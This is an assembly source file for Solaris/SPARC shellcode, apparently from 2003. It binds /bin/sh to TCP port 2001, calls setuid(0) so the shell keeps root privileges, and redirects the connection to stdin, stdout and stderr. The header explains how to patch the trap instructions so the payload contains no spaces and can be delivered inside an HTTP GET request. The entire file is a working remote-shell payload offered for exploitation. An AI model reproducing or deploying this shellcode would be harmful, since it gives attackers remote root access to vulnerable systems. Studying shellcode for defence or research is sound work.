!!! $Id: sparc-bind.s,v 1.1 2003/03/01 01:10:51 ghandi Exp $
!!! Bind /bin/sh to TCP port 2001.  Calls setuid(0) so /bin/sh won't
!!! drop privileges.  After assembly, change the third byte in the
!!! trap instructions to 0x38 to avoid having spaces in the input so that
!!! it may be used in an HTTP GET request.  For Solaris/SPARC.
!!!
!!! "I've come here to chew bubble-gum and kick ass...And I'm all out of
!!! bubble gum."
!!! -- Nada (Roddy Piper), "They Live"
!!!
!!! -ghandi < ghandi@mindless.com >
!!!

.global	bindsh
.type bindsh,#function

bindsh:	sub	%sp, 16, %l0		! struct sockaddr sa;

	sub	%sp, %l0, %l7;
	st	%l7, [%sp - 20]		! int sa_len = 16;

	sub	%l7, 14, %o0
	sub	%l7, 14, %o1
	xor	%l1, %l1, %o2
	xor	%l1, %l1, %o3		! %o3 will be used as a %g0
	sub	%l7, 15, %o4
	add	%l7, (230 - 16), %g1
	ta	8
	xor	%o2, %o0, %l2		! s = socket(AF_INET, SOCK_STREAM, 0);

	sth	%o1, [%sp - 16]		! sa.sin_family = AF_INET;
	mov	2001, %l6
	sth	%l6, [%sp - 14]		! sa.sin_port = 2001;
	st	%g0, [%sp - 12]		! sa.sin_addr.s_addr = INADDR_ANY;

	xor	%o3, %l2, %o0
	xor	%o3, %l0, %o1
	xor	%o3, %l7, %o2
	add	%l7, (232 - 16), %g1
	ta	8			! bind(s, &sa, sa_len);

	xor	%o3, %l2, %o0
	sub	%l7, (16 - 5), %o1
	add	%l7, (233 - 16), %g1
	ta	8			! listen(s, SOMAXCONN);

	xor	%o3, %l2, %o0
	xor	%o3, %l0, %o1
	sub	%sp, 20, %o2
	add	%l7, (234 - 16), %g1
	ta	8
	xor	%o3, %o0, %l3		! c = accept(s, &sa, &sa_len);

	xor	%o3, %l3, %o0
	sub	%l7, (16 - 9),  %o1
	xor	%sp, %sp, %o2
	add	%l7, (62 - 16), %g1
	ta	8			! ioctl(c, I_DUP2FD, 0);

	xor     %o3, %l3, %o0
        sub     %l7, (16 - 9),  %o1
	add	%o3, 1, %o2
	add	%l7, (62 - 16), %g1
	ta	8			! ioctl(c, I_DUP2FD, 1);

	xor     %o3, %l3, %o0
        sub     %l7, (16 - 9),  %o1
	add	%o3, 2, %o2
	add	%l7, (62 - 16), %g1
	ta	8			! ioctl(c, I_DUP2FD, 2);

	xor	%sp, %sp, %o0		! %o0 = 0;
	add	%o3, 23, %g1
	ta	8			! setuid(0);
	set	0x2f62696e, %l0		! (void*)sh = '/bin';
	set	0x2f736800, %l1		! (void*)sh + 4 = '/sh0';
	sub	%sp, 16, %o0		! %o0 = '/bin/sh';
	sub	%sp, 8, %o1		! %o1 = {'/bin/sh', NULL};
	xor	%sp, %sp, %o2		! %o2 = NULL;
	std	%l0, [%sp - 16]
	st	%o0, [%sp - 8]		! argv[0] = sh;
	st	%g0, [%sp - 4]		! argv[1] = NULL;
	add	%o3, 59, %g1
	ta	8			! execve(sh, argv, NULL);
	xor	%sp, %sp, %o0		! %o0 = 0;
	add	%o3, 160, %g1		! %g1 = 160;
	ta	8			! lwp_exit(0)